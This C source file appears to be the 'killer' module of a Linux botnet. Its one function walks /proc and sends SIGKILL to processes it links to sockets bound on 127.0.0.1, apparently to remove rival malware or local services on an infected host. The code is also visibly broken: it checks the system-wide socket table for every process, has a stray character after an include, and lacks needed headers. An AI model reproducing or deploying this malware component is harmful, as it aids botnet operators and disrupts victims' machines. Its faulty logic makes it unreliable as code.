#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>?
#include <sys/inotify.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/connector.h>
#include <linux/cn_proc.h>
#include <stdbool.h>

#include "headers/killer.h"
  
  
void dam_bot_she_gay() {
    DIR* proc = opendir("/proc");
    if (proc == NULL) {
        return;
    }

    struct dirent* entry;
    while ((entry = readdir(proc)) != NULL) {
        if (!isdigit(*(entry->d_name))) {
            continue;
        }

        char cmdline_path[64];
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);

        FILE* cmdline_file = fopen(cmdline_path, "r");
        if (cmdline_file == NULL) {
            continue;
        }

        char cmdline[256];
        if (fgets(cmdline, sizeof(cmdline), cmdline_file)) {
            // Remove trailing newline character
            cmdline[strcspn(cmdline, "\n")] = '\0';

            // Check if the process is listening on 127.0.0.1
            FILE* net_file = fopen("/proc/net/tcp", "r");
            if (net_file == NULL) {
                fclose(cmdline_file);
                continue;
            }

            char line[256];
            while (fgets(line, sizeof(line), net_file)) {
                unsigned int local_addr;
                sscanf(line, "%*s %08X", &local_addr);

                struct in_addr in;
                in.s_addr = htonl(local_addr);

                if (strcmp(inet_ntoa(in), "127.0.0.1") == 0) {
                    // Process is listening on 127.0.0.1, kill it
                    pid_t process_id = (pid_t)strtol(entry->d_name, NULL, 10);
                    if (process_id > 0) {
                        //printf("Killing process %d\n", process_id);
                        kill(process_id, 9);
                    }
                    break;
                }
            }

            fclose(net_file);
        }

        fclose(cmdline_file);
    }

    closedir(proc);
}

